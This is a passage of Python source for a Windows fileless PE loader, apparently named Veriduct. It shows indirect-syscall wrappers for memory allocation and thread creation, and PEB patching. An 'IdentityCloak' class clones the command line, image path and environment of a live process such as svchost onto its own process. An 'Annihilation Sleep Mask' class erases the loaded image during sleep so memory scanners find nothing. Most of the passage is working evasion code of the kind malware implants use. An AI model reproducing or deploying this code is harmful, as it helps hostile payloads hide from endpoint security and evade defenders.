        st = fn(ctypes.c_void_p(-1), ctypes.byref(ba), ctypes.c_void_p(0),
                ctypes.byref(rs), ctypes.c_ulong(alloc_type), ctypes.c_ulong(protect))
        if st < 0:
            logging.debug(f"SyscallEngine: NtAllocateVirtualMemory: 0x{st & 0xFFFFFFFF:08X}")
            return 0
        return ba.value or 0

    def nt_protect(self, address, size, new_protect):
        fn = self.get_syscall_func(
            "NtProtectVirtualMemory", ctypes.c_long,
            ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p),
            ctypes.POINTER(ctypes.c_size_t), ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
        )
        if not fn:
            return False, 0
        ba = ctypes.c_void_p(address)
        rs = ctypes.c_size_t(size)
        old = ctypes.c_ulong(0)
        st = fn(ctypes.c_void_p(-1), ctypes.byref(ba), ctypes.byref(rs),
                ctypes.c_ulong(new_protect), ctypes.byref(old))
        return (True, old.value) if st >= 0 else (False, 0)

    def nt_free(self, address, size=0, free_type=0x8000):
        fn = self.get_syscall_func(
            "NtFreeVirtualMemory", ctypes.c_long,
            ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p),
            ctypes.POINTER(ctypes.c_size_t), ctypes.c_ulong,
        )
        if not fn:
            return False
        ba = ctypes.c_void_p(address)
        rs = ctypes.c_size_t(size)
        return fn(ctypes.c_void_p(-1), ctypes.byref(ba), ctypes.byref(rs), ctypes.c_ulong(free_type)) >= 0

    def nt_create_thread(self, start_address, parameter=None):
        fn = self.get_syscall_func(
            "NtCreateThreadEx", ctypes.c_long,
            ctypes.POINTER(ctypes.c_void_p), ctypes.c_ulong, ctypes.c_void_p,
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
            ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        )
        if not fn:
            return 0
        h = ctypes.c_void_p(0)
        st = fn(ctypes.byref(h), ctypes.c_ulong(0x1FFFFF), ctypes.c_void_p(0),
                ctypes.c_void_p(-1), ctypes.c_void_p(start_address),
                ctypes.c_void_p(parameter or 0), ctypes.c_ulong(0),
                ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0))
        return (h.value or 0) if st >= 0 else 0

    def nt_wait(self, handle, timeout_ms=0xFFFFFFFF):
        fn = self.get_syscall_func(
            "NtWaitForSingleObject", ctypes.c_long,
            ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p,
        )
        if not fn:
            return -1
        tp = ctypes.c_void_p(0) if timeout_ms == 0xFFFFFFFF else ctypes.byref(ctypes.c_longlong(-timeout_ms * 10000))
        return fn(ctypes.c_void_p(handle), ctypes.c_int(0), tp)

    def nt_close(self, handle):
        fn = self.get_syscall_func("NtClose", ctypes.c_long, ctypes.c_void_p)
        return fn(ctypes.c_void_p(handle)) >= 0 if fn else False

    def cleanup(self):
        if not self._trampoline_allocs:
            return
        freed = 0
        if self._VirtualFree:
            for addr in self._trampoline_allocs:
                try:
                    self._VirtualFree(addr, 0, 0x8000)
                    freed += 1
                except:
                    pass
        if freed:
            logging.debug(f"SyscallEngine: Freed {freed} trampolines")
        self._trampoline_allocs.clear()
        self._trampolines.clear()


_syscall_engine = None

def get_syscall_engine():
    global _syscall_engine
    if _syscall_engine is None:
        _syscall_engine = SyscallEngine()
    return _syscall_engine



class CRTInitializer:
    def __init__(self, base_addr, stream, is_64bit, load_config_rva=0, load_config_size=0, command_line=None):
        self.base_addr = base_addr
        self.stream = stream
        self.is_64bit = is_64bit
        self.load_config_rva = load_config_rva
        self.load_config_size = load_config_size
        self.peb_ptr = None
        self.orig_image_base = None
        self.orig_command_line = None
        self.command_line = command_line  # New: command line args to pass to PE
        
    def _get_peb(self):
        if self.peb_ptr is not None:
            return self.peb_ptr
        
        # Use StealthResolver to get PEB - it already has it cached from initialization
        resolver = get_stealth_resolver()
        if hasattr(resolver, '_peb') and resolver._peb is not None:
            # StealthResolver already has PEB from its bootstrap
            self.peb_ptr = ctypes.pointer(resolver._peb)
            return self.peb_ptr
        
        # Fallback: resolve functions via stealth and call them
        NtQueryInformationProcess_addr = resolver.get_proc_address("ntdll.dll", "NtQueryInformationProcess")
        GetCurrentProcess_addr = resolver.get_proc_address("kernel32.dll", "GetCurrentProcess")
        
        if not NtQueryInformationProcess_addr or not GetCurrentProcess_addr:
            raise RuntimeError("Failed to resolve NtQueryInformationProcess/GetCurrentProcess")
        
        NtQueryInformationProcess = ctypes.WINFUNCTYPE(
            ctypes.c_long, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(wintypes.ULONG)
        )(NtQueryInformationProcess_addr)
        
        GetCurrentProcess = ctypes.WINFUNCTYPE(ctypes.c_void_p)(GetCurrentProcess_addr)
        
        pbi = PROCESS_BASIC_INFORMATION()
        ret_len = wintypes.ULONG()
        status = NtQueryInformationProcess(
            GetCurrentProcess(), 0, ctypes.byref(pbi),
            ctypes.sizeof(pbi), ctypes.byref(ret_len))
        if status != 0:
            raise RuntimeError(f"NtQueryInformationProcess failed: {status}")
        self.peb_ptr = pbi.PebBaseAddress
        return self.peb_ptr
    
    def initialize(self):
        logging.info("Initializing CRT environment...")
        self._init_security_cookie()
        self._patch_peb()
        self._patch_command_line()
        logging.info("CRT initialization complete")
    
    def _patch_peb(self):
        try:
            peb = self._get_peb()
            self.orig_image_base = peb.contents.ImageBaseAddress
            peb.contents.ImageBaseAddress = ctypes.c_void_p(self.base_addr)
            logging.debug(f"PEB.ImageBaseAddress patched to 0x{self.base_addr:X}")
        except Exception as e:
            logging.warning(f"Failed to patch PEB: {e}")
    
    def _patch_command_line(self):
        """Patch the command line in PEB.ProcessParameters."""
        if not self.command_line:
            return
        try:
            peb = self._get_peb()
            params = peb.contents.ProcessParameters.contents
            
            # Save original
            self.orig_command_line = (
                params.CommandLine.Length,
                params.CommandLine.MaximumLength,
                params.CommandLine.Buffer
            )
            
            # Create new command line string (wide chars)
            cmd_wide = self.command_line
            if not cmd_wide.endswith('\x00'):
                cmd_wide += '\x00'
            
            # Allocate and set new command line
            new_buffer = ctypes.create_unicode_buffer(cmd_wide)
            params.CommandLine.Buffer = ctypes.cast(new_buffer, wintypes.LPWSTR)
            params.CommandLine.Length = (len(self.command_line)) * 2  # Wide chars
            params.CommandLine.MaximumLength = (len(cmd_wide)) * 2
            
            # Keep reference to prevent garbage collection
            self._cmd_buffer = new_buffer
            
            logging.debug(f"CommandLine patched to: {self.command_line}")
        except Exception as e:
            logging.warning(f"Failed to patch CommandLine: {e}")
    
    def _init_security_cookie(self):
        if self.load_config_rva == 0:
            logging.warning("No Load Config RVA found. Skipping cookie init.")
            return
        try:
            # CRITICAL FIX: 
            # On x64, SecurityCookie is at offset 0x58 (88), NOT 0x60.
            # On x86, SecurityCookie is at offset 0x3C (60).
            cookie_ptr_offset = 0x58 if self.is_64bit else 0x3C
            
            required_size = cookie_ptr_offset + (8 if self.is_64bit else 4)
            if self.load_config_size < required_size:
                logging.warning(f"Load Config too small for cookie (Size: {self.load_config_size})")
                return
                
            load_config_va = self.base_addr + self.load_config_rva
            cookie_va_addr = load_config_va + cookie_ptr_offset
            
            if self.is_64bit:
                cookie_va = ctypes.c_uint64.from_address(cookie_va_addr).value
            else:
                cookie_va = ctypes.c_uint32.from_address(cookie_va_addr).value
                
            if cookie_va == 0:
                logging.warning("Security Cookie VA is NULL. Skipping.")
                return
                
            # Generate and write random cookie
            if self.is_64bit:
                new_cookie = random.randint(0x0000FFFF00000000, 0x0000FFFFFFFFFFFF)
                ctypes.c_uint64.from_address(cookie_va).value = new_cookie
            else:
                new_cookie = random.randint(0x0000FFFF, 0x7FFFFFFF)
                ctypes.c_uint32.from_address(cookie_va).value = new_cookie
                
            logging.info(f"Security cookie at 0x{cookie_va:X} set to 0x{new_cookie:X}")
        except Exception as e:
            logging.error(f"Failed to init security cookie: {e}")
    
    def restore(self):
        if self.orig_image_base is not None and self.peb_ptr is not None:
            try:
                self.peb_ptr.contents.ImageBaseAddress = self.orig_image_base
            except:
                pass

# ==============================================================================
# Identity Cloak - Runtime PEB Identity Masquerade (Live Clone)
# ==============================================================================
# Enumerates running processes, picks a real instance of the target, reads its
# actual PEB values via ReadProcessMemory, and clones them onto the current
# process.  The disguise is an exact copy of something already running on the
# box — not a guess, not a hardcoded string.
#
# What it modifies  (ASSUMED — no kernel verification):
#   CommandLine, ImagePathName, CurrentDirectory, Environment
#
# What it cannot modify (VERIFIED — kernel-enforced):
#   Token SID, Integrity Level, Session ID, EPROCESS ImageFileName
# ==============================================================================

# Toolhelp32 snapshot struct
class _PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize",              wintypes.DWORD),
        ("cntUsage",            wintypes.DWORD),
        ("th32ProcessID",       wintypes.DWORD),
        ("th32DefaultHeapID",   ctypes.c_void_p),
        ("th32ModuleID",        wintypes.DWORD),
        ("cntThreads",          wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase",      wintypes.LONG),
        ("dwFlags",             wintypes.DWORD),
        ("szExeFile",           wintypes.WCHAR * 260),
    ]

# Remote PEB reading offsets — bitness-aware (FIX 5, v2.3)
# Selected at module load based on pointer size of the current interpreter.
# When cloning a remote process, the remote process's bitness must match
# (cloning a WoW64 process from a 64-bit Python is not supported).
_IS_64BIT_PROCESS = ctypes.sizeof(ctypes.c_void_p) == 8

if _IS_64BIT_PROCESS:
    _PP_OFFSET_IN_PEB      = 0x20   # PEB -> ProcessParameters pointer
    _CMD_OFFSET_IN_PP      = 0x70   # ProcessParameters -> CommandLine
    _IMGPATH_OFFSET_IN_PP  = 0x60   # ProcessParameters -> ImagePathName
    _CURDIR_OFFSET_IN_PP   = 0x38   # ProcessParameters -> CurrentDirectory.DosPath
    _ENV_OFFSET_IN_PP      = 0x80   # ProcessParameters -> Environment pointer
    _US_SIZE               = 16     # sizeof(UNICODE_STRING) on x64
    _PTR_FMT               = '<Q'   # struct format for pointer reads
    _PTR_SIZE              = 8
else:
    _PP_OFFSET_IN_PEB      = 0x10   # PEB -> ProcessParameters pointer (x86)
    _CMD_OFFSET_IN_PP      = 0x40   # ProcessParameters -> CommandLine (x86)
    _IMGPATH_OFFSET_IN_PP  = 0x38   # ProcessParameters -> ImagePathName (x86)
    _CURDIR_OFFSET_IN_PP   = 0x24   # ProcessParameters -> CurrentDirectory.DosPath (x86)
    _ENV_OFFSET_IN_PP      = 0x48   # ProcessParameters -> Environment pointer (x86)
    _US_SIZE               = 8      # sizeof(UNICODE_STRING) on x86: USHORT+USHORT+PTR
    _PTR_FMT               = '<I'   # struct format for pointer reads
    _PTR_SIZE              = 4

# Access rights
_PROCESS_QUERY_INFORMATION = 0x0400
_PROCESS_VM_READ           = 0x0010
_TH32CS_SNAPPROCESS        = 0x00000002
_INVALID_HANDLE            = ctypes.c_void_p(-1).value & 0xFFFFFFFFFFFFFFFF


class IdentityCloak:
    """
    Live-clones PEB identity markers from a real running process.
    """

    def __init__(self, target_name: str = None, custom_config: dict = None):
        """
        Args:
            target_name:   Process name to clone, e.g. "svchost" or "RuntimeBroker".
                           Resolved to a live PID at apply() time.
            custom_config: Dict with explicit values (skips live enumeration).
                           Keys: command_line, image_path, current_dir,
                                 env_username, env_userdomain
        """
        self.target_name = target_name
        self.custom_config = custom_config
        self.active = False
        self.config = {}   # populated at apply() time

        self._orig_command_line = None
        self._orig_image_path = None
        self._orig_current_dir = None
        self._orig_env_ptr = None
        self._alloc_buffers = []
        self._peb_ptr = None
        self._params_addr = None
        self._VirtualAlloc = None
        self._VirtualFree = None

    # ------------------------------------------------------------------
    # Live process enumeration
    # ------------------------------------------------------------------

    def _resolve_enum_apis(self):
        """Resolve Toolhelp32 + remote PEB reading APIs via stealth."""
        r = get_stealth_resolver()
        self._CreateToolhelp32Snapshot = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD
        )(r.get_proc_address("kernel32.dll", "CreateToolhelp32Snapshot"))

        self._Process32FirstW = ctypes.WINFUNCTYPE(
            wintypes.BOOL, ctypes.c_void_p, ctypes.POINTER(_PROCESSENTRY32W)
        )(r.get_proc_address("kernel32.dll", "Process32FirstW"))

        self._Process32NextW = ctypes.WINFUNCTYPE(
            wintypes.BOOL, ctypes.c_void_p, ctypes.POINTER(_PROCESSENTRY32W)
        )(r.get_proc_address("kernel32.dll", "Process32NextW"))

        self._OpenProcess = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, wintypes.DWORD, wintypes.BOOL, wintypes.DWORD
        )(r.get_proc_address("kernel32.dll", "OpenProcess"))

        self._CloseHandle = ctypes.WINFUNCTYPE(
            wintypes.BOOL, ctypes.c_void_p
        )(r.get_proc_address("kernel32.dll", "CloseHandle"))

        self._ReadProcessMemory = ctypes.WINFUNCTYPE(
            wintypes.BOOL, ctypes.c_void_p, ctypes.c_void_p,
            ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
        )(r.get_proc_address("kernel32.dll", "ReadProcessMemory"))

        nqip = r.get_proc_address("ntdll.dll", "NtQueryInformationProcess")
        self._NtQueryInformationProcess = ctypes.WINFUNCTYPE(
            ctypes.c_long, ctypes.c_void_p, ctypes.c_ulong,
            ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(wintypes.ULONG)
        )(nqip)

    def _find_target_pids(self, name: str) -> list:
        """Return list of PIDs matching process name (case-insensitive)."""
        name_lower = name.lower()
        # Normalise: allow "svchost" or "svchost.exe"
        if not name_lower.endswith('.exe'):
            name_lower += '.exe'

        snap = self._CreateToolhelp32Snapshot(_TH32CS_SNAPPROCESS, 0)
        snap_int = snap if isinstance(snap, int) else ctypes.cast(snap, ctypes.c_void_p).value or 0
        if snap_int == 0 or snap_int == _INVALID_HANDLE:
            logging.warning("IdentityCloak: CreateToolhelp32Snapshot failed")
            return []

        pids = []
        entry = _PROCESSENTRY32W()
        entry.dwSize = ctypes.sizeof(_PROCESSENTRY32W)

        if self._Process32FirstW(snap_int, ctypes.byref(entry)):
            while True:
                exe = entry.szExeFile
                if exe.lower() == name_lower:
                    pids.append(entry.th32ProcessID)
                entry.dwSize = ctypes.sizeof(_PROCESSENTRY32W)
                if not self._Process32NextW(snap_int, ctypes.byref(entry)):
                    break

        self._CloseHandle(snap_int)
        return pids

    def _read_remote_mem(self, hProcess, address: int, size: int) -> bytes:
        """ReadProcessMemory wrapper."""
        buf = ctypes.create_string_buffer(size)
        bytes_read = ctypes.c_size_t(0)
        ok = self._ReadProcessMemory(
            hProcess, ctypes.c_void_p(address),
            buf, size, ctypes.byref(bytes_read)
        )
        if not ok or bytes_read.value == 0:
            return b''
        return buf.raw[:bytes_read.value]

    def _read_remote_pointer(self, hProcess, address: int) -> int:
        """Read a pointer from remote process memory (bitness-aware, FIX 5)."""
        data = self._read_remote_mem(hProcess, address, _PTR_SIZE)
        if len(data) < _PTR_SIZE:
            return 0
        return struct.unpack(_PTR_FMT, data)[0]

    def _read_remote_unicode_string(self, hProcess, us_address: int) -> str:
        """Read a UNICODE_STRING from a remote process (bitness-aware, FIX 5)."""
        # UNICODE_STRING layout:
        #   x64: USHORT Length, USHORT MaxLen, 4-byte pad, PWSTR Buffer (total 16)
        #   x86: USHORT Length, USHORT MaxLen, PWSTR Buffer            (total 8)
        us_data = self._read_remote_mem(hProcess, us_address, _US_SIZE)
        if len(us_data) < _US_SIZE:
            return ""
        length = struct.unpack('<H', us_data[0:2])[0]      # byte length
        # Buffer pointer starts at offset 8 (x64, after 4-byte pad) or 4 (x86, no pad)
        buf_offset = 8 if _IS_64BIT_PROCESS else 4
        buf_ptr = struct.unpack(_PTR_FMT, us_data[buf_offset:buf_offset + _PTR_SIZE])[0]
        if length == 0 or buf_ptr == 0:
            return ""
        raw = self._read_remote_mem(hProcess, buf_ptr, length)
        if not raw:
            return ""
        return raw.decode('utf-16-le', errors='replace').rstrip('\x00')

    def _read_remote_environment(self, hProcess, env_ptr: int) -> dict:
        """Read environment block from remote process. Returns dict of relevant vars."""
        if not env_ptr:
            return {}
        # Read up to 64KB, scan for double-null
        raw = self._read_remote_mem(hProcess, env_ptr, 0x10000)
        if not raw:
            return {}
        # Find double-null terminator (UTF-16)
        end = len(raw)
        i = 0
        while i < len(raw) - 3:
            if raw[i:i+4] == b'\x00\x00\x00\x00':
                end = i + 4
                break
            i += 2
        text = raw[:end].decode('utf-16-le', errors='replace')
        env_vars = [v for v in text.split('\x00') if v and '=' in v]
        result = {}
        for var in env_vars:
            name, _, value = var.partition('=')
            result[name.upper()] = value
        return result

    def _clone_from_pid(self, pid: int) -> dict:
        """Open a remote process and read its PEB identity markers."""
        hProcess = self._OpenProcess(
            _PROCESS_QUERY_INFORMATION | _PROCESS_VM_READ, False, pid
        )
        h_int = hProcess if isinstance(hProcess, int) else ctypes.cast(hProcess, ctypes.c_void_p).value or 0
        if not h_int:
            logging.debug(f"IdentityCloak: cannot open PID {pid} (access denied)")
            return {}

        try:
            # Get remote PEB address via NtQueryInformationProcess
            pbi = PROCESS_BASIC_INFORMATION()
            ret_len = wintypes.ULONG()
            status = self._NtQueryInformationProcess(
                h_int, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(ret_len)
            )
            if status != 0:
                logging.debug(f"IdentityCloak: NtQueryInformationProcess failed for PID {pid}: 0x{status & 0xFFFFFFFF:X}")
                return {}

            peb_addr = ctypes.cast(pbi.PebBaseAddress, ctypes.c_void_p).value
            if not peb_addr:
                return {}

            # Read ProcessParameters pointer from PEB
            pp_addr = self._read_remote_pointer(h_int, peb_addr + _PP_OFFSET_IN_PEB)
            if not pp_addr:
                logging.debug(f"IdentityCloak: ProcessParameters is NULL for PID {pid}")
                return {}

            # Read identity markers
            cmd_line   = self._read_remote_unicode_string(h_int, pp_addr + _CMD_OFFSET_IN_PP)
            image_path = self._read_remote_unicode_string(h_int, pp_addr + _IMGPATH_OFFSET_IN_PP)
            cur_dir    = self._read_remote_unicode_string(h_int, pp_addr + _CURDIR_OFFSET_IN_PP)

            # Read environment
            env_ptr = self._read_remote_pointer(h_int, pp_addr + _ENV_OFFSET_IN_PP)
            env_dict = self._read_remote_environment(h_int, env_ptr)

            config = {}
            if cmd_line:
                config["command_line"] = cmd_line
            if image_path:
                config["image_path"] = image_path
            if cur_dir:
                config["current_dir"] = cur_dir
            if "USERNAME" in env_dict:
                config["env_username"] = env_dict["USERNAME"]
            if "USERDOMAIN" in env_dict:
                config["env_userdomain"] = env_dict["USERDOMAIN"]

            logging.info(f"  Cloned identity from PID {pid}:")
            if cmd_line:
                logging.info(f"    CommandLine: {cmd_line[:80]}{'...' if len(cmd_line) > 80 else ''}")
            if image_path:
                logging.info(f"    ImagePath:   {image_path}")
            if cur_dir:
                logging.info(f"    CurrentDir:  {cur_dir}")
            if "USERNAME" in env_dict:
                logging.info(f"    USERNAME:    {env_dict['USERNAME']}")
            if "USERDOMAIN" in env_dict:
                logging.info(f"    USERDOMAIN:  {env_dict['USERDOMAIN']}")

            return config

        finally:
            self._CloseHandle(h_int)

    def _resolve_config(self):
        """
        Build the cloak config. Priority:
          1. custom_config (explicit values, no enumeration)
          2. Live clone from target_name (enumerate, pick, read PEB)
        """
        # Explicit custom values — skip enumeration entirely
        if self.custom_config:
            self.config = {k: v for k, v in self.custom_config.items() if v is not None}
            if self.config:
                logging.info("  Using custom cloak config (no enumeration)")
                return True

        if not self.target_name:
            return False

        # Live enumeration
        self._resolve_enum_apis()
        pids = self._find_target_pids(self.target_name)

        if not pids:
            logging.warning(f"IdentityCloak: no running instances of '{self.target_name}' found")
            return False

        logging.info(f"  Found {len(pids)} instance(s) of {self.target_name}: {pids[:10]}{'...' if len(pids) > 10 else ''}")

        # Try each PID until we get a successful read
        # Shuffle to avoid always picking the same one
        random.shuffle(pids)
        for pid in pids:
            config = self._clone_from_pid(pid)
            if config:
                self.config = config
                return True
            # If we can't read this one (access denied, etc.), try next

        logging.warning(f"IdentityCloak: could not read PEB from any {self.target_name} instance")
        return False

    # ------------------------------------------------------------------
    # PEB writing (applies cloned values to our own process)
    # ------------------------------------------------------------------

    def _resolve_write_apis(self):
        resolver = get_stealth_resolver()
        va = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
        vf = resolver.get_proc_address("kernel32.dll", "VirtualFree")
        if not va or not vf:
            raise RuntimeError("IdentityCloak: failed to resolve VirtualAlloc/VirtualFree")
        self._VirtualAlloc = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
        )(va)
        self._VirtualFree = ctypes.WINFUNCTYPE(
            ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
        )(vf)

    def _get_peb(self):
        if self._peb_ptr is not None:
            return self._peb_ptr
        resolver = get_stealth_resolver()
        if hasattr(resolver, '_peb') and resolver._peb is not None:
            self._peb_ptr = ctypes.pointer(resolver._peb)
            return self._peb_ptr
        raise RuntimeError("IdentityCloak: cannot access PEB")

    def _get_params_addr(self):
        if self._params_addr is not None:
            return self._params_addr
        peb = self._get_peb()
        val = ctypes.cast(peb.contents.ProcessParameters, ctypes.c_void_p).value
        if not val:
            raise RuntimeError("IdentityCloak: ProcessParameters is NULL")
        self._params_addr = val
        return val

    def _alloc_wide(self, text: str) -> int:
        raw = (text + '\x00').encode('utf-16-le')
        buf = self._VirtualAlloc(None, len(raw), 0x3000, 0x04)
        if not buf:
            raise RuntimeError(f"VirtualAlloc failed ({len(raw)} bytes)")
        addr = buf if isinstance(buf, int) else ctypes.cast(buf, ctypes.c_void_p).value
        ctypes.memmove(addr, raw, len(raw))
        self._alloc_buffers.append(addr)
        return addr

    @staticmethod
    def _save_us(us) -> tuple:
        return (us.Length, us.MaximumLength, us.Buffer)

    def _write_us(self, us, text: str):
        addr = self._alloc_wide(text)
        char_count = len(text)
        us.Buffer = ctypes.cast(addr, wintypes.LPWSTR)
        us.Length = ctypes.c_ushort(char_count * 2)
        us.MaximumLength = ctypes.c_ushort((char_count + 1) * 2)

    def _modify_environment(self, params_addr: int, username: str = None, userdomain: str = None):
        if username is None and userdomain is None:
            return

        env_ptr_loc = params_addr + _ENV_OFFSET_IN_PP
        env_ptr = ctypes.c_void_p.from_address(env_ptr_loc).value
        if not env_ptr:
            logging.warning("IdentityCloak: Environment pointer is NULL")
            return

        self._orig_env_ptr = env_ptr

        max_scan = 0x10000
        raw = bytes((ctypes.c_char * max_scan).from_address(env_ptr))
        end = max_scan
        i = 0
        while i < len(raw) - 3:
            if raw[i:i+4] == b'\x00\x00\x00\x00':
                end = i + 4
                break
            i += 2

        env_text = raw[:end].decode('utf-16-le', errors='replace')
        env_vars = [v for v in env_text.split('\x00') if v]

        new_vars = []
        for var in env_vars:
            if '=' not in var:
                new_vars.append(var)
                continue
            name, _, value = var.partition('=')
            if username is not None and name.upper() == 'USERNAME':
                new_vars.append(f"USERNAME={username}")
            elif userdomain is not None and name.upper() == 'USERDOMAIN':
                new_vars.append(f"USERDOMAIN={userdomain}")
            else:
                new_vars.append(var)

        new_block = ('\x00'.join(new_vars) + '\x00\x00').encode('utf-16-le')
        buf = self._VirtualAlloc(None, len(new_block), 0x3000, 0x04)
        if not buf:
            logging.warning("IdentityCloak: failed to allocate environment block")
            return
        addr = buf if isinstance(buf, int) else ctypes.cast(buf, ctypes.c_void_p).value
        ctypes.memmove(addr, new_block, len(new_block))
        self._alloc_buffers.append(addr)
        ctypes.c_void_p.from_address(env_ptr_loc).value = addr

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def apply(self):
        """Enumerate target, clone its PEB, apply to our process."""
        logging.info("=" * 50)
        logging.info("IDENTITY CLOAK: LIVE CLONE")
        logging.info("=" * 50)

        try:
            # Phase 1: figure out what to clone
            if not self._resolve_config():
                logging.warning("  Cloak aborted — no identity to clone.")
                return

            # Phase 2: write cloned values into our own PEB
            self._resolve_write_apis()
            peb = self._get_peb()
            params = peb.contents.ProcessParameters.contents
            params_addr = self._get_params_addr()

            if self.config.get("command_line"):
                self._orig_command_line = self._save_us(params.CommandLine)
                self._write_us(params.CommandLine, self.config["command_line"])
                logging.info(f"  CommandLine -> {self.config['command_line'][:72]}{'...' if len(self.config['command_line']) > 72 else ''}")

            if self.config.get("image_path"):
                self._orig_image_path = self._save_us(params.ImagePathName)
                self._write_us(params.ImagePathName, self.config["image_path"])
                logging.info(f"  ImagePath   -> {self.config['image_path']}")

            if self.config.get("current_dir"):
                self._orig_current_dir = self._save_us(params.CurrentDirectory.DosPath)
                self._write_us(params.CurrentDirectory.DosPath, self.config["current_dir"])
                logging.info(f"  CurrentDir  -> {self.config['current_dir']}")

            eu = self.config.get("env_username")
            ed = self.config.get("env_userdomain")
            if eu is not None or ed is not None:
                self._modify_environment(params_addr, eu, ed)
                if eu:
                    logging.info(f"  USERNAME    -> {eu}")
                if ed:
                    logging.info(f"  USERDOMAIN  -> {ed}")

            self.active = True
            logging.info("  Identity cloak active.")
            logging.info("=" * 50)

        except Exception as e:
            logging.error(f"IdentityCloak: failed to apply: {e}")

    def restore(self):
        """Restore original PEB values. Safe to call multiple times."""
        if not self.active:
            return
        logging.debug("IdentityCloak: restoring original markers")

        try:
            peb = self._get_peb()
            params = peb.contents.ProcessParameters.contents
            params_addr = self._get_params_addr()

            if self._orig_command_line:
                params.CommandLine.Length, params.CommandLine.MaximumLength, params.CommandLine.Buffer = self._orig_command_line
            if self._orig_image_path:
                params.ImagePathName.Length, params.ImagePathName.MaximumLength, params.ImagePathName.Buffer = self._orig_image_path
            if self._orig_current_dir:
                cd = params.CurrentDirectory.DosPath
                cd.Length, cd.MaximumLength, cd.Buffer = self._orig_current_dir
            if self._orig_env_ptr is not None:
                env_ptr_loc = params_addr + _ENV_OFFSET_IN_PP
                ctypes.c_void_p.from_address(env_ptr_loc).value = self._orig_env_ptr
        except Exception as e:
            logging.debug(f"IdentityCloak: restore failed (non-critical): {e}")

        if self._VirtualFree:
            for buf in self._alloc_buffers:
                try:
                    self._VirtualFree(ctypes.c_void_p(buf), 0, 0x8000)
                except:
                    pass
        self._alloc_buffers.clear()
        self.active = False

# ==============================================================================
# Memory Substrate - Fileless Execution Framework
# ==============================================================================

# ==============================================================================
# Annihilation Sleep Mask
# ==============================================================================
#
# Instead of encrypting the PE image during sleep (leaving a high-entropy blob
# that memory scanners flag), Veriduct's sleep mask *annihilates* the PE:
#   1. Captures the live PE image (post-relocation, post-IAT)
#   2. Shatters + entangles + chunks it via existing Veriduct primitives
#   3. VirtualFree's the PE region — it no longer exists in memory
#   4. Chunks live as Python bytearray objects in Python's managed heap,
#      indistinguishable from any other application data
#   5. Sleeps via NtDelayExecution (through indirect syscall + stack spoof)
#   6. On wake: re-allocates PE at the same base, reconstructs from chunks,
#      re-applies section protections, returns to PE code
#
# The PE's thread stack is a separate allocation and survives the free.
# The return address on the stack points back into .text which is restored
# before the callback returns — the PE resumes as if Sleep() returned normally.
#
# IAT Integration: Sleep/SleepEx are hooked during import resolution.
# The hook is a ctypes WINFUNCTYPE callback that runs in the PE's thread
# context, so no cross-thread coordination is needed.
#
# Requires: SyscallEngine (indirect syscalls) or falls back to standard APIs.
# Uses: semantic_shatter, entangle_chunks, semantic_unshatter, disentangle_chunks
# ==============================================================================

class SleepMask:
    """
    Annihilation-based sleep masking for in-memory PE images.

    Memory scanners find nothing because the PE literally does not exist
    during sleep — not encrypted, not obfuscated, not present.
    """

    def __init__(self, pe_base: int, pe_size: int, sections: list,
                 is_64bit: bool = True, ssm_null_rate: float = 0.01,
                 entanglement_groups: int = 3, chunk_size: int = 4096):
        """
        Args:
            pe_base:       Base address of the mapped PE image
            pe_size:       Total size of the PE image (SizeOfImage)
            sections:      List of dicts with 'addr', 'size', 'char' (from loader)
            is_64bit:      PE bitness
            ssm_null_rate: Null insertion rate for semantic shatter
            entanglement_groups: XOR entanglement group size
            chunk_size:    Chunk size for splitting the image
        """
        self.pe_base = pe_base
        self.pe_size = pe_size
        self.sections = sections  # For re-applying protections on wake
        self.is_64bit = is_64bit
        self.ssm_null_rate = ssm_null_rate
        self.entanglement_groups = entanglement_groups
        self.chunk_size = chunk_size

        # State preserved across sleep cycles
        self._scattered_chunks = None       # List[bytes] — shattered/entangled chunks
        self._ssm_seeds = None              # List[bytes] — SSM seeds per chunk
        self._ssm_inserts = None            # List[List[int]] — SSM insert positions
        self._entanglement_info = None      # Dict — entanglement group metadata
        self._masked = False
        self._mask_count = 0

        # Callback pointers (prevent GC while PE holds IAT reference)
        self._sleep_callback = None
        self._sleep_ex_callback = None

        # API references
        self._syscall_eng = None
        self._VirtualAlloc = None
        self._VirtualProtect = None
        self._VirtualFree = None
        self._NtDelayExecution = None

        self._resolve_apis()
        logging.info(f"SleepMask: Initialized for PE at 0x{pe_base:X} ({pe_size} bytes)")

    def _resolve_apis(self):
        """Resolve memory management APIs — prefer SyscallEngine, fallback to stealth."""
        try:
            self._syscall_eng = get_syscall_engine()
            if not self._syscall_eng.available:
                self._syscall_eng = None
        except Exception:
            self._syscall_eng = None

        # Always resolve fallbacks (needed for operations without Nt equivalents)
        resolver = get_stealth_resolver()

        va = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
        vp = resolver.get_proc_address("kernel32.dll", "VirtualProtect")
        vf = resolver.get_proc_address("kernel32.dll", "VirtualFree")

        if va:
            self._VirtualAlloc = ctypes.WINFUNCTYPE(
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
                ctypes.c_ulong, ctypes.c_ulong
            )(va)
        if vp:
            self._VirtualProtect = ctypes.WINFUNCTYPE(
